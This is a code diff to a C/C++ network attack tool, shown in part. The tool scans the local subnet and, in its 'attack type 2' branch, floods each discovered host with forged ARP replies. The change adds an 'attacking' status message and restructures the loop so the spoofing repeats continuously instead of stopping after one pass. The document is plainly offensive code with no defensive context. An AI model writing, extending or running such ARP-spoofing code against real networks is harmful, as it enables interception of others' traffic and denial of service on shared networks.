@@ -95,10 +95,10 @@ static void scan_host(const char* ifname) {
         return ;
     }
     if ((info.ip & 0x7F000000) == 0x7F000000) {  // 排除lo网卡
-        printf("ignore interface [%s]\n", ifname);
+        fprintf(stderr, "ignore interface [%s]\n", ifname);
         return ;
     }
-    printf("self ip:%s mask:%s mac:%s\n", info.ip_str.c_str(),
+    fprintf(stdout, "self ip:%s mask:%s mac:%s\n", info.ip_str.c_str(),
             info.netmask_str.c_str(), info.mac_str.c_str());
 
     host_cnt = (info.netmask ^ 0xFFFFFFFF) - 1;
@@ -108,8 +108,8 @@ static void scan_host(const char* ifname) {
     end.s_addr = htonl(end_ip);
     snprintf(start_s, sizeof(start_s), "%s", inet_ntoa(start));
     snprintf(end_s, sizeof(end_s), "%s", inet_ntoa(end));
-    printf("scan ip: %s - %s\n", start_s, end_s);
-    printf("total: %d\n", host_cnt);
+    fprintf(stdout, "scan ip: %s - %s\n", start_s, end_s);
+    fprintf(stdout, "total: %d\n", host_cnt);
 
     int ret = pthread_create(&tid, NULL, on_recv_arp_func, NULL);
     if(ret != 0) {
@@ -360,6 +360,7 @@ int main(int argc, const char *argv[]) {
         fprintf(stdout, "\n");
     } else if (att_type == 2) {
         scan_host(ifname);
+        fprintf(stdout, "======>attacking");
         while (run) {
             std::map<std::string, host_info>::iterator itr;
             for (itr = ips.begin(); itr != ips.end() && run; itr++) {
@@ -398,14 +399,12 @@ int main(int argc, const char *argv[]) {
                 memcpy(&rsp_arpbuf, &req_arpbuf, sizeof(req_arpbuf));
                 rsp_arpbuf.op = 2;
                 send_arp_packet(&rsp_arpbuf);
-
-                usleep(500000);
-                fprintf(stdout, ".");
-                fflush(stdout);
             }
-            fprintf(stdout, "\n");
-            break;
+            usleep(500000);
+            fprintf(stdout, ".");
+            fflush(stdout);
         }
+        fprintf(stdout, "\n");
     } else {
         fprintf(stderr, "unknown attack type, [%d]\n", att_type);
         return -1;
